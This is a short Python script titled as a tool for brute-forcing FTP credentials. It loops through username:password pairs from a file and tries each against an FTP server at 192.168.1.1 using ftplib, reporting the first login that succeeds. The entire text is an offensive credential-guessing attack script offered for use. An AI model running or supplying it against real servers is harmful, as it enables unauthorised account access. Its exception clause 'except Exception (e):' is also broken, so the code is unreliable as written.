####################################################################################
#                                                                                  #
#                  Using Ftplib To Bruteforce FTP User Cridentials                 #
#                                                                                  #
####################################################################################

import ftplib

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')

	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')

		print ("[+] Trying : " + userName + "/" + passWord)

		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)

			print ("\n[*] " + str(hostname) +\
				" FTP Login Succeeded: " + userName + "/" + passWord)
			ftp.quit()

			return (userName, passWord)

		except Exception (e):
			pass

	print ("[-] Could Not BruteForce FTP Cridentials..!")
	return (None, None)

host = '192.168.1.1'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)